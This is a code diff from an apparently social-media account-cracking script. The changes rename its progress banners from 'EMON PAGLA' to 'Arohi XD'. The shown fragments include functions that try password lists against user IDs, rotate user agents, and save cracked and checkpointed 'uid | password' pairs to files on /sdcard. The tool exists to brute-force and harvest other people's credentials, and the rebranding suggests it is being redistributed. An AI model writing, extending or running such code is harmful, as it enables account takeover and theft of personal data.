@@ -849,7 +849,7 @@ def login(uid):
 def crack(idf, pwv):
     global loop, ok, cp, cps, oks
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mArohi XD 🍬•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -920,7 +920,7 @@ def crack(idf, pwv):
 def crackfree(idf, pwv):
     global loop, ok, cp, cps, oks
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mArohi XD🍬•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -999,7 +999,7 @@ def crackfree(idf, pwv):
 def cracktouch(idf, pwv):
     global cp, ok, loop
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mArohi XD 🍬•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -1076,7 +1076,7 @@ def cracktouch(idf, pwv):
 def crackhost(idf, pwv):
     global cp, ok, loop
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mArohi XD 🍬•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(uadef)
@@ -1254,7 +1254,7 @@ def rndm2(uid, passlist):
     global cps
     global proxy
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f'\r\r{B}[{G}Arohi XD-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r{B}[{G}Arohi XD🍬-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -1414,7 +1414,7 @@ def rndm3(uid, passlist):
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
-                    print(f'\r\033[1;30m[Emon--CP] {uid} [💔] {pas} ')
+                    print(f'\r\033[1;30m[Arohi-CP] {uid} [💔] {pas} ')
                     with open('/sdcard/--𝙲𝙿.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
